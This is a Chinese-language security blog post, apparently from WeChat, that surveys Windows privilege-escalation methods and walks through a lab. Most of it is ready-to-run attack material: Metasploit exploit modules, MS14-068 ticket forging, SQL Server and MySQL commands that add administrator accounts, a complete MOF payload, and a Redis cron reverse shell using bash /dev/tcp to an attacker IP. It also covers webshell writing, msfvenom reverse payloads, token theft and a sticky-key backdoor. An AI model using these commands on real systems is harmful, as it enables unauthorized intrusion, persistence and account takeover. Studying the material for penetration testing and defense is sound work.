> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/GzYWhDhUO26DjYGxLw4sMA)

**windows 提权小结及靶场实践**

![](https://mmbiz.qpic.cn/mmbiz_gif/Jvbbfg0s6ADPmHFz2qUd6yribKia4q80LibqdJMLXIdtoEicYqlxxcia9hAy2jbf52zgkk0Wuz5VIuqTVTIUibp06DjA/640?wx_fmt=gif)

一、概述 1

二、漏洞提权 2

2.1 补丁收集 2

2.2 CVE-2020-0787 2

2.3 CVE-2018-8120 3

2.4 CVE-2019-0803 3

2.5 MS16-075（烂土豆） 4

2.6 MS14-068（域内提权） 5

三、数据库提权 7

3.1 Sql Server 7

3.2 Mysql 9

3.3 Redis 12

四、Windows 特性 13

4.1 AT 提权 13

4.2 进程注入提权 13

4.3 SC 提权 13

4.4 PsExec 提权 14

4.5 令牌窃取 14

4.6 不带引号的服务路径 15

4.7 不安全的服务权限 16

4.8 Dll 劫持 17

4.9 PrintSpoofer 提权 17

4.10 GPP 组策略首选项 17

五、第三方软件提权 19

5.1 Teamview 19

5.2 FileZilla 19

七、靶场实践 20

7.1 子域名收集 20

7.2 主机发现 21

7.3 端口扫描 21

7.4 web 漏洞测试 23

7.5 内网横移 26

**1** **一、概述**

这次一起来小结下 Windows 常用提权方式，主要分为：漏洞提权、数据库提权、Windows 特性提权、第三方软件提权等。由于小弟的能力还比较薄弱，文章尚有纰漏还请师傅海涵。

**2** **二、漏洞提权**

测试环境均在 win7x64 sp1

### **2.1 补丁收集**

当接收到会话后，可以使用 msf 自带的命令：

```
use post/multi/recon/local_exploit_suggester
set SESSION 10
run
```

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADPmHFz2qUd6yribKia4q80Libdomvkro81GpvtgibeicRF4FobssTwKdTd3icLTxvrGCyh3fcB95NaQ89g/640?wx_fmt=png)

同样也可以使用 https://github.com/chroblert/WindowsVulnScan 搜索系统缺失的补丁：

先运行其 ps 脚本得到系统中所打的补丁号：

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADPmHFz2qUd6yribKia4q80LibADRISAG5vmE88qMb38iaOQWnztCiaC0maOVbFxP4SJQiaghmfUHNsUfRg/640?wx_fmt=png)

python.exe .\check.py -u 创建 CVEKB 数据库后，接着 python.exe.\check.py -C -f .\KB.json 查看操作系统打的补丁，以及存在可进行漏洞利用的公开 EXP 漏洞。

### **2.2 CVE-2020-0787**

漏洞背景：BackgroundIntelligent TransferService（BITS）是其中的一个后台智能传输服务组件。BITS 中存在提权漏洞，该漏洞源于该服务无法正确处理符号链接。攻击者可通过执行特制的应用程序利用该漏洞覆盖目标文件，提升权限。

漏洞危害：影响 windows 全版本

exp 下载地址：https://github.com/cbwang505/CVE-2020-0787-EXP-ALL-WINDOWS-VERSION

漏洞验证：

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADPmHFz2qUd6yribKia4q80Libia9kDgxibjT5XnkdDYIxCkdGkZqWLSOQx4EPTLIn1ibTyKjUxqEZV30oA/640?wx_fmt=png)

### **2.3** **CVE-2018-8120**

漏洞背景：CVE-2018-8120 是 Windows 操作系统 Win32k 的内核提权漏洞，Windows 系统 win32k.sys 组件的 NtUserSetImeInfoEx() 系统服务函数内部未验证内核对象中的空指针对象, 普通应用程序可利用该空指针漏洞以内核权限执行任意代码。

漏洞危害：Windows7 SP1/2008 SP2,2008 R2 SP1

exp 下载地址：https://github.com/SecWiki/windows-kernel-exploits/blob/master/CVE-2018-8120

漏洞验证：

Msf 集成了该漏洞的 payload，当 msf 反弹会话后，执行下面命令

```
use exploit/windows/local/ms18_8120_win32k_privesc
set SESSION 10
exploit
```

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADPmHFz2qUd6yribKia4q80LibltIeeoCRDYHgicWjfykRzjMveJZ8maryFhGAksuFG9ftSYRNqeg3Kiaw/640?wx_fmt=png)

因为是利用内核提权，可见返回的直接是 system 权限的会话。

### 2.4 CVE-2019-0803

漏洞背景：Win32k 组件无法正确处理内存中的对象时，可导致特权提升。成功利用此漏洞的攻击者可以在内核模式中运行任意代码、安装任意程序、查看、更改或删除数据、或者创建拥有完全用户权限的新帐户。

漏洞危害：Windows7/8/10/2008/2012/2016

exp 下载地址：https://github.com/ExpLife0011/CVE-2019-0803

漏洞验证：

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADPmHFz2qUd6yribKia4q80LibiaQuiapNBLt2KKlBib6tlLIMbKwgTgPbZXbDEEqq6LxMduktxbV3IicqTg/640?wx_fmt=png)

### **2.5 MS16-075（烂土豆）**

漏洞背景：WindowsSMB 服务器特权提升漏洞，当攻击者转发适用于在同一计算机上运行的其他服务的身份验证请求时，Microsoft 服务器消息块 (SMB) 中存在特权提升漏洞，成功利用此漏洞的攻击者可以使用提升的特权执行任意代码。若要利用此漏洞，攻击者首先必须登录系统。然后，攻击者可以运行一个为利用此漏洞而经特殊设计的应用程序，从而控制受影响的系统。

漏洞危害：windows2003/2008/7/8/2012

exp 下载地址：https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-075

漏洞验证：

当 msf 反弹会话后，执行下面命令，使用烂土豆提权，一次不行用多次

```
use exploit/windows/local/ms16_075_reflection_juicy
set session 10
exploit
```

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADPmHFz2qUd6yribKia4q80LibuZxDB1TktlrnXeFhF98SB1a0V55XaR5nalIziavaHlxGyibfrKHhMy8w/640?wx_fmt=png)

后续可以用令牌窃取或者 getsystem 命令获取到 system 权限：

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADPmHFz2qUd6yribKia4q80Libgfjs4BSSj3VCZvHmGOSHF4UuFG8u4PGiaSwxpd7IE3icVB1wPbO7my9g/640?wx_fmt=png)

### **2.6 MS14-068（域内提权）**

漏洞背景：MS14-068 这个漏洞是位于 kdcsvc.dll 域控制器的密钥分发中心（KDC）服务中的 Windows 漏洞，它允许经过身份验证的用户在其获得的票证 TGT 中插入任意的 PAC 。普通用户可以通过呈现具有改变了 PAC 的 TGT 来伪造票据获得管理员权限。

攻击者要利用 MS14-068 这个漏洞提权时，需要掌握下面几个信息：

• 域内任意用户 SID

• 域内任意用户密码

漏洞危害：windows2003/2008/2012/7/8

exp 下载地址：https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068

漏洞验证：

先用 whoami/user 查看当前用户 sid

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADPmHFz2qUd6yribKia4q80LibLgVbzon79MYDAicGiaOZ34OaUNtMlbUMAticjzibsHZMicc3nmeg0TNN1gQ/640?wx_fmt=png)

Kerberos::purge 或 klistpurge 先清空当前机器中的所有凭证：

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADPmHFz2qUd6yribKia4q80LibPma02VgVmfTyY097gnWNAjDw6UaaFxr7dbWqAwG7SLUS1Uwcs8mIYQ/640?wx_fmt=png)

利用 MS14-068 生成相应凭证：

```
MS14-068.exe -u c@test.com -sS-1-5-21-2273191065-1635484360-3888421177-1105 -d 192.168.202.148 -pc@zxcvbnm123
```

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADPmHFz2qUd6yribKia4q80LibTCNeoQJmeOmbMcOqevdtTyGMWzlOzMiaPWQjYIyyFhBmH1DdiakfpGSw/640?wx_fmt=png)

使用 mimikatz 将票据注入内存：

```
Kerberos::ptc "TGT_c@test.com.ccache"
```

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADPmHFz2qUd6yribKia4q80LibNLxI5bMGWNJW2gANZKbJ0uzCXzKt3XiaKVoeOCaManwY7OJsNpRPgjQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADPmHFz2qUd6yribKia4q80Lib13SbBeqicJrzibJ54CbnkZc7iavSEYF8n7yGr9vr50QGO9vdo0jHCAryw/640?wx_fmt=png)

后续利用：

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADPmHFz2qUd6yribKia4q80LibMntEicQ95MgibYbVJCTf9hARbBXgdVXtslqAFPxnuvWvWdFPDnl27WAg/640?wx_fmt=png)

**3** **三、数据库提权**

### **3.1 Sql Server**

##### Xp_cmdshell 提权

Xp_cmdshell 扩展时可以执行系统命令的，而 sqlserver 默认就是 system 权限，这是我们能利用其提权的原因。默认 sa 支持外连。

判断权限是不是 sa  
selectis_srvrolemember('sysadmin')

判断 xp_cmdshell 扩展存储是否存在  

```
select count(*) from master.dbo.sysobjects where xtype = 'x' AND name='xp_cmdshell'
```

判断 xp_regread 扩展存储过程是否存在

```
select count(*) from master.dbo.sysobjects where name='xp_regread'
```

开启 xp_cmdshell  

```
exec sp_configure 'show advanced options', 1;reconfigure;
exec sp_configure 'xp_cmdshell',1;reconfigure;
```

关闭 xp_cmdshell  

```
execsp_configure 'show advanced options', 1;reconfigure;
execsp_configure 'xp_cmdshell', 0;reconfigure
```

提权  

```
exec master..xp_cmdshell 'net user test qwea123. /add'    添加用户test，密码test
exec master..xp_cmdshell 'net localgroup administrators test add'   添加test用户到管理员组
```

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADPmHFz2qUd6yribKia4q80LibboYFrBprPic8v3EDicxN1MNmhMAd4CI7bVOw7rB5df64PahJghxiaV4fg/640?wx_fmt=png)

##### sp_oacreate 提权

sp_oacreate 提权主要调用了 OLE 对象的 run 方法执行了系统命令。Mssql 之后的版本先要开启。

开启

```
execsp_configure 'show advanced options',1;reconfigure;
execsp_configure 'ole automation procedures',1; reconfigure;
```

关闭

```
execsp_configure 'show advanced options',1;reconfigure;
execsp_configure 'ole automation procedures',0;reconfigure;
execsp_configure 'show advanced options',0;reconfig
```

ure;  

执行命令

```
declare@shell int
execsp_oacreate 'wscript.shell', @shell output
execsp_method @shell, 'run' , null, 'c:\windows\system32\cmd.exe /c "netuser test qwea123. /add" '
```

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADPmHFz2qUd6yribKia4q80LiboXqYlMicWEBGp4nOR00M9mVpHg3O99gIdxQtltyAc3rSRic1tj61jNicQ/640?wx_fmt=png)

##### 沙盒提权：

```
execsp_configure 'show advanced options',1;reconfigure;
```

-- 不开启的话在执行 xp_regwrite 会提示让我们开启，

execsp_configure 'Ad Hoc Distributed Queries',1;reconfigure;

-- 关闭沙盒模式，如果一次执行全部代码有问题，先执行上面两句代码。

```
execmaster..xp_regwrite'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',0;
```

-- 查询是否正常关闭，经过测试发现沙盒模式无论是开，还是关，都不会影响我们执行下面的语句。

```
execmaster.dbo.xp_regread'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode'
```

-- 执行系统命令

```
select * fromopenrowset('microsoft.jet.oledb.4.0',';database=c:/windows/system32/ias/ias.mdb','selectshell("net user test3 qwea123. /add")')
```

### **3.2 Mysql**

##### UDF 提权

udf= ‘user definedfunction’，即‘用户自定义函数’。是通过添加新函数，对 MYSQL 的功能进行扩充，其提权原理，利用了 root 高权限，创建带有调用 cmd 的函数的 udf.dll 动态链接库，可以通过以下几种方法得到 root 密码：

读取网站数据库配置文件

读取数据库存储或备份文件

暴力破解，root 默认不支持外连就要上传脚本到服务器爆破

使用 UDF 提权先要知道 MySql 对应的版本：selectversion()

Mysql< 5.1 导出目录 c:/windows 或 system32

Mysql=> 5.1 导出目录 /lib/plugin/

目录可以手工创建，也可以使用 NTFS 流创建:select‘x’ into dumpfile ‘数据库目录 /lib/plugin::INDEX_ALLLOCATION‘

查看数据库安装目录:Select@@basedir

查看 MySQL 版本:selectversion();

查看 MySQL 的插件目录:select@@plugin_dir;

创建 lib 目录:select'it is dll' into dumpfile 'c:\program files\mysql\mysql server5.1\lib::$INDEX_ALLOCATION';

创建 plugin 目录:

```
select'it is dll' into dumpfile 'c:\program files\mysql\mysql server5.1\plugin::$INDEX_ALLOCATION';
```

创建 udf.dll

```
select unhex('hex_of_udf.dll') into dumpfile "c:\programfiles\mysql\mysql server 5.1\plugin\udf.dll";
```

php 文件已集成了相关导出功能，点击导出即可：

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADPmHFz2qUd6yribKia4q80LiblRxA4GYoKQfR1lAcH5KbCoeDfHCVgQ4VG6iaSwOxqZVLb5ax2VAosvQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADPmHFz2qUd6yribKia4q80LibHDgvFLqX1XOG7InCYTBICPKctCNyticLqE9AUuoMTZ0SDfwen3Y9brQ/640?wx_fmt=png)

创建函数：createfunction sys_eval returns string soname 'udf.dll';

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADPmHFz2qUd6yribKia4q80LibXaC4X0HxvxoqapKuFOfiaw4ey7DFnZn7qrTU3RicjzcU8MTyZIzicaA9Q/640?wx_fmt=png)

执行 shell 命令：selectsys_eval('net user');

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADPmHFz2qUd6yribKia4q80LibvscU04FM1tcJDCHG540yVounM6LI74BCgZdsQIgq5zs8F9XK5SycQQ/640?wx_fmt=png)

##### **MOF 提权**

mof 是 windows 系统的一个文件（在 c:/windows/system32/wbem/mof/nullevt.mof）叫做 " 托管对象格式 " 其作用是每隔五秒就会去监控进程创建和死亡。MOF 提权的原理就是当拥有 mysql 的 root 权限了以后，然后使用 sql 语句将系统当中默认的 nullevt.mof 给替换掉，进而让系统执行我们这个恶意的 mof 文件。

替换的 sql 语句：selectload_file('D:\wamp\my.mof') into dumpfile'c:/windows/system32/wbem/mof/nullevt.mof';

mof 文件代码如下所示：

```
#pragmanamespace("\\\\.\\root\\subscription")


instanceof __EventFilter as $EventFilter
{
EventNamespace = "Root\\Cimv2";
Name  = "filtP2";
Query = "Select * From __InstanceModificationEvent "
"Where TargetInstance Isa \"Win32_LocalTime\" "
"And TargetInstance.Second = 5";
QueryLanguage = "WQL";
};
instanceof ActiveScriptEventConsumer as $Consumer
{
Name = "consPCSV2";
ScriptingEngine = "JScript";
ScriptText =
"var WSH = newActiveXObject(\"WScript.Shell\")\nWSH.run(\"net.exeuser admin admin /add\")";
};
instanceof __FilterToConsumerBinding
{
Consumer   = $Consumer;
Filter = $EventFilter;
};
```

有可能权限不够文件写入 c:/windows/system32/ 目录失败，或者被防护软件拦截等情况出现。

##### **启动项提权**

导出自定义可执行文件到启动目录配合重启执行

先执行 sql 语句开启 root 外连：

GRANTALL PRIVILEGES ON *.* TO root@"%" IDENTIFIED BY "root";

flushprivileges;

Msf 使用内置的 windows/mysql/mysql_start_sql 模块，连接数据库，把后门写入服务器启动项：

useexploit/windows/mysql/mysql_start_up

setrhosts 192.168.202.1

setusername root

setpassword root

注意：mysql5.7 导出数据提示 --secure-file-priv 选项问题，查看 secure_file_priv 的值，默认为 NULL，表示限制不能导入导出，而 secure_file_priv 参数是只读参数，不能使用 setglobal 命令修改。所以我们需要打开 my.cnf 或 my.ini，加入以下语句后重启 mysql。

secure_file_priv=''

没有值时，表示不限制 mysqld 在任意目录的导入导出。

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADPmHFz2qUd6yribKia4q80Lib0URqiaOStKCRiaeK65iayfHakKJk4tlKGS7Oju0IvbrapFy7lGu6kGqvA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADPmHFz2qUd6yribKia4q80LibfG0FickEQGpLlvaNicaic2IUL3BazibDLcAulFANyznCtYqr1iaYznwMTzQ/640?wx_fmt=png)

### **3.3 Redis**

##### 未授权访问漏洞

Redis 未授权访问是由于自身配置不当所造成的，没有配置指定 ip 登录远程登录密码为空等，可以通过绑定数据库访问的 ip、设置数据库访问的密码、修改数据库服务运行账户的权限修补。

其漏洞利用方法也有好几种，可以利用计划任务来反弹一个 shell：

先在自己的服务器上监听一个端口：

nc-lvnp 7999

利用计划任务执行命令反弹 shell，依次执行以下命令反弹得到系统权限：

```
redis-cli-h 192.168.63.130
setx "\n* * * * * bash -i >& /dev/tcp/192.168.63.128/79990>&1\n"
configset dir /var/spool/cron/
configset dbfilename root
save
```

再用 crontab-l 查看 root 用户下的 crontab 任务。

同样可以通过通过漏洞写入文件，当 redis 权限不高时，并且服务器开着 web 服务，在 redis 有 web 目录写权限时，可以尝试往 web 路径写 webshell：

```
config set dir /var/www/html/
config set dbfilename shell.php
setx "<?php phpinfo();?>"
save
```

**4** **四、Windows 特性**

### 4.1 AT 提权

这个特性只在 windowsserver 2003、windowsxp 有效（有点古老了），在系统 cmd 窗口输入 at12:00 /interactive cmd.exe 新建计划任务，到特点时间点系统以 system 身份自动执行该任务。

### **4.2 进程注入提权**

这个特性只在 windowsserver 2003、windowsxp 有效（同样有点古老了），利用的是注入进程的所有者权限共享机制。使用 pinjector.exe-l 查看可注入的进程，再执行 pinjector.exe-p 注入 PID cmd 监听端口号，在 kali 执行 nc 监听即可。

### **4.3 SC 提权**

这个特性只在 windowsserver 2003、windowsxp 有效，win7 需要管理员权限才能添加作业（约等于没用）。

sc Create systemcmd binPath= "cmd /K start" type= own type=interact

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADPmHFz2qUd6yribKia4q80Lib88JFG7V4tk7W0Ph8gWBtdmiaITEJZVJPLGR4Em9b8fDibMLgN3hHJEVg/640?wx_fmt=png)

Sc start systemcmd

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADPmHFz2qUd6yribKia4q80LibN55eJK0l6ickwkicmPibrP4FytVicRZjafMticw4pia5cxrIy1Lnl4Ixb6Hw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADPmHFz2qUd6yribKia4q80Lib2k2DVWvcudhiaTSM6HnuCAHuKruNdrAejIzDanmLGzZeMnvrCdF9lvg/640?wx_fmt=png)

### **4.4 PsExec 提权**

此特性在 win7、windowsserver 2003、2008 有效

PsExec.exe /accepteula /s \\127.0.0.1 cmd /c "whoami"

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADPmHFz2qUd6yribKia4q80Libdt5n3aB9tnXO58nwwyvtvBZRXFbQkuWvVT8FnIJNbV1gTIWFX4mYCA/640?wx_fmt=png)

### **4.5 令牌窃取**

令牌窃取可以在 windowsserver 2008\2003、windows7\xp 运行。令牌 (token) 是系统的临时秘钥，相当于账号和密码，用来决定是否允许这次请求和判断这次请求是属于哪一个用户的。它允许你在不提供密码或其他凭证的前提下，访问网络和系统资源，这些令牌将持续存在于系统中，除非系统重新启动。

令牌中的信息包括与进程或线程关联的用户帐户的标识和特权。当用户登录时，系统通过将用户密码与安全数据库中存储的信息进行比较来验证用户密码。如果密码通过身份验证，则系统将生成访问令牌。该用户执行的每个进程都有此访问令牌的副本。

Windows 的令牌有两种：

1、Delegationtoken(授权令牌): 用于交互会话登录，例如远程桌面

2、Impersonationtoken(模拟令牌): 用于非交互登录，例如 dir 远程主机的文 c$

攻击者必须已经在特权用户上下文（即管理员）中才能窃取令牌，也就是说需要 bypassuac。攻击者通常使用令牌窃取将其安全上下文从管理员级别提升到 SYSTEM 级别。如果帐户对远程系统具有适当的权限，则可以使用令牌作为该令牌的帐户向远程系统进行身份验证。

窃取令牌背后实现是分以下几步：

1、我们需要是管理员，如果不是，可以使用 bypassuac、烂土豆等技术进行提权。

2、复制访问令牌的进程需要启用 SeDebugPrivilege 权限。

3、使用 OpenProcess 函数获取具有 SYSTEM 权限的进程句柄。

4、使用 OpenProcessToken 函数获取该进程的令牌句柄。

5、使用 DuplicateTokenEx 函数对令牌进程复制。

6、通过 CreateProcessWithToken 函数用复制的令牌创建新的进程，该进程成为拥有 SYSTEM 权限的进程。

下面具体操作：

```
msfvenom -p windows/meterpreter/reverse_http lhost=192.168.202.131 lport=22222-f exe -o h4.exe  //生成exe
use exploit/multi/handler  //建立监听
set payload windows/meterpreter/reverse_http
set lport 22222
set lhost 192.168.202.131
```

useincognito

list_tokens-u   获取用户 Token

上面为交互登录 Token，可见没有 bypassuac 的情况下是没有 system 的，下面为非交互登录会话 Token

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADPmHFz2qUd6yribKia4q80Lib3zDrQKRMZ45qDI2syU7TRYemsXx3WwcpLZYe1RkxZ1vzHibzcrP3wgQ/640?wx_fmt=png)

use exploit/windows/local/bypassuac

set session 5

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADPmHFz2qUd6yribKia4q80Lib3iaOElqAoja0e9e9JKib8KvbbySf44moLCQe3QaLAGDQeaUbMNPjhqXA/640?wx_fmt=png)

impersonate_token“NT AUTHORITY\SYSTEM” 进行令牌假冒

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADPmHFz2qUd6yribKia4q80LibO5th87lrLgibNQxCGesr0A6ePWOUtDN0YfKrI8eIMlFjA1iaiaIO5jmgA/640?wx_fmt=png)

### **4.6 不带引号的服务路径**

当 windows 服务中的路径没有被引号包含，则操作系统会执行空格分割后服务路径的前一部分。所以我们可以构造并上传路径名称的文件，然后重启服务，达到提权母的。

先输入命令检测不带引号的服务路径：

```
wmicservice get name,displayname,pathname,startmode |findstr /i "Auto"|findstr /i /v "C:\Windows\\" |findstr /i /v """
```

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADPmHFz2qUd6yribKia4q80LibSOEEtIqLJbO9YHmdxpP3rAC5cRdoD3DFDvNtU7bvyCrneHeOuo71sg/640?wx_fmt=png)

可见第一个是没有空格，没有问题，mytest3 则有问题。

我们在 c 盘下，新建文件，并新建 cmd 窗口执行 C:\ProgramFiles\cmd.exe，则执行到 Program.exe 文件

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADPmHFz2qUd6yribKia4q80LibzvxG2lTsYibew1LJkfz59zmtuqmiblsSxb445Eypzd87ZzmqI28MGia7g/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADPmHFz2qUd6yribKia4q80Libjy4dhPbl9HPDcQjCUVxR7zjMEC8RjiaNia5yYFF0BicPiclwTTbdMTVvow/640?wx_fmt=png)

### **4.7 不安全的服务权限**

由于服务配置管理的错误，用户对服务拥有过多的权限，有可能直接修改服务中的执行文件。可使用 accesschk.exe 查找特定用户可修改的服务：

accesschk.exe -uwcqv “qqqq” *

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADPmHFz2qUd6yribKia4q80Lib0MpyrgHicvtSRUd0hk6l9dfsJIgI5eZZRScxL5pg2eZmDD70BQhyMfA/640?wx_fmt=png)

使用 sc 指令修改并重启服务

```
sc config "mytest" binpath= “C:\ccc.exe”
sc start "mytest"
```

### **4.8 Dll 劫持**

Lpk 提权就是 Dll 劫持的一种，主要原理就是利用所执行的 exe 程序优先加载同目录下的 dll，且没有对其加载的 dll 进行验证，具体演示在之前钓鱼文章中：

攻击者需要 dll 劫持提权满足以下三个点：

1、系统中存在 dll 劫持的 exe 程序

2、当前权限能替换 exe 程序同目录中的 dll 文件

3、管理员权限去执行该 exe 程序

### **4.9 PrintSpoofer 提权**

使用 PrintSpoofer 工具提权的原理是，当我们具有了 SeAssignPrimaryTokenPrivilege 或 SeImpersonatePrivilege 特权时，可以通过上述这两个特权，在其他用户的上下文中运行代码，甚至创建新的进程，那就意味着能具有 SYSTEM 权限：

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADPmHFz2qUd6yribKia4q80LibImDtEdzJZKicH7rnZdQfeqy0nYcpicibZHzyOdzlLmQOicz4ZjdjLYCtIA/640?wx_fmt=png)

上图是当 getshell 后，whoami\all 查看当前拥有了 SeImpersonatePrivilege 的特权，我们就可以调用 CreateProcessWithToken()，使其创建新进程并拥有 SYSTEM 权限，而 PrintSpoofer 就是这样的一款开源工具，如下图所示：

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADPmHFz2qUd6yribKia4q80Libfro0tCicyic6qiaQaCXynj9ZiaKObY1z27m2cxHImU4NGdxyqX8yQugzZw/640?wx_fmt=png)

或者当前拥有 SeAssignPrimaryTokenPrivilege 特权时，就可以调用 CreateProcessAsUser()，也同样有上述效果。

### **4.10 GPP 组策略首选项**

SYSVOL 是指存储域公共文件服务器副本的共享文件夹，它们在域中所有的域控制器之间复制。Sysvol 文件夹是安装 AD 时创建的，它用来存放 GPO、Script 等信息。同时，存放在 Sysvol 文件夹中的信息，会复制到域中所有 DC 上。所有域组策略都存储在这里：\\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\，SYSVOL 是所有经过身份验证的用户具有读访问权限的 ActiveDirectory 中的域范围共享。

每台 Windows 主机有一个内置的 Administrator 账户以及相关联的密码。输入 gpmc.msc 打开组策略管理，然后新建组策略对象:

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADPmHFz2qUd6yribKia4q80LibPGrJnaoGCQrE9ZFgRQYk7qUR8F87TSkSgVxq0mNwrRkrTS7nHhXia2A/640?wx_fmt=png)

将域中本地计算机的用户名重命名，并重新设置密码:

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADPmHFz2qUd6yribKia4q80Lib61VNAjZFXsbsicgFC9wWibCzoD8BiaB81TXfAtUY2c5ichVQoO78q5Sib6w/640?wx_fmt=png)

访问：\\test.com\SYSVOL\test.com\Policies\{FF11D485-D5DA-48BC-9F6E-790B3A55D3B2}\Machine\Preferences\Groups\Groups.xml

当创建新的 GPP 时，在 SYSVOL 中创建了一个与相关配置数据相关联的 XML 文件，如果提供了密码，那么 AES-256 位加密应该足够强的。

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADPmHFz2qUd6yribKia4q80LibMznfFgS0kDVQXLCd8yEnJYTExVY3IibgPmXZK8nUeCMDCPRl7d70T2w/640?wx_fmt=png)

**5** **五、第三方软件提权**

### **5.1 Teamview**

CVE-2019-18988TeamViewer 特权提升漏洞分析

通过 14.7.1965 的 TeamViewerDesktop，可以绕过远程登录访问控制，因为同一密钥用于不同客户的安装。至少从 v7.0.43148 起，它就在所有安装中都使用了共享的 AES 密钥，并且在该产品的当前版本中至少将其用于 OptionsPasswordAES。如果攻击者知道此密钥，则他们可以解密存储在 TeamViewer 注册表或配置文件中的保护信息。在 v9.x 之前的版本中，这使攻击者可以解密系统的无人参与访问密码（这允许远程登录系统以及浏览无头文件）。最新版本的 OptionPasswordAES 仍使用相同的密钥，但似乎已更改了无人参与访问密码的存储方式。

以下两个链接师傅复现和分析得很详细（膜:

https://hackergu.com/cve-2019-18988-teamviewer-decryptteamviewer/

https://www.4hou.com/posts/L5KX

CVE-2020-13699

TeamViewer 存在未引用的搜索路径或元素的安全缺陷，更具体地说，这是由于应用程序没有正确引用它的自定义 URI 处理程序，当安装了 TeamViewer 的易受攻击版本的系统访问恶意创建的网站时，可能会被利用。

攻击者可以使用精心制作的 URL（iframesrc='teamviewer10:--play\\attacker-IP\share\fake.tvs'）将恶意 iframe 嵌入网站中，这将启动 TeamViewerWindows 桌面客户端并强制其执行以下操作：打开远程 SMB 共享。Windows 在打开 SMB 共享时将执行 NTLM 身份验证，并且可以将请求进行转发（使用诸如响应程序之类的工具）以执行代码（或捕获以进行哈希破解）。

### **5.2 FileZilla**

FileZilla 是一个 ftp 服务器，启动时默认时 SYSTEM 权限，假如相关目录权限配置不严，可以在 xml 文件中读取到 server 的密码，得到密码后登录 server 再对 setch.exe 进行替换，从而实现 shift 粘滞键后门.

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADPmHFz2qUd6yribKia4q80LibgIL3fX6XIAb4jEoY9a7ichLeJ6cAHHVwAfT2cTHjUQmwSyBvlybUORw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADPmHFz2qUd6yribKia4q80LibQxgbFekt7KiaoOGwqwOylRHRHibyKiaNqt84iaGic6Y3nRVQr1YcdhcknTg/640?wx_fmt=png)

**七、靶场实践**
==========

下面我们靶场的拓扑图：

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADPmHFz2qUd6yribKia4q80Libq7qRdRdawiaH8kicYrUF06cPXdqLmhyONEyjElHy4ASNKY8Zribn6tGjw/640?wx_fmt=png)

### **7.1 子域名收集**

我们可以通过主域名发 test123.com 收集更多的域名，从而获得更多的目标。子域名收集的工具很多 layer、subDomainBrute，这里使用 kali 自带的 wfuzz 收集子域名，以下为开源地址 https://github.com/xmendez/wfuzz

```
wfuzz -w /usr/share/amass/wordlists/subdomains-top1mil-5000.txt -uwww.test123.com -H "Host:FUZZ.test123.com" --hw 53
```

-H 指定 UserAgent，FUZZ 的位置在 host 里，原因是 Host 请求头决定访问哪个虚拟主机  

--hw 以指定的返字数作为判断条件隐藏返回结果

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADPmHFz2qUd6yribKia4q80Libj6KA622VB5xhbYaLsckLdIunmwnzswb0ic0qOJpgo5ib1zslmj93DHMg/640?wx_fmt=png)

得到以下三个域名：

www.test123.com

net.test123.com

cms.test123.com

然后通过 nslookup 查询域名对应的 ip（没 cdn 的情况下）**：**

Nslookupwww.test123.com

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADPmHFz2qUd6yribKia4q80LibXvrYlZnuzwCFL3CicuZrmHDI59sMaZicAWGrtPK8BctB0XVG6zeaib4Kw/640?wx_fmt=png)

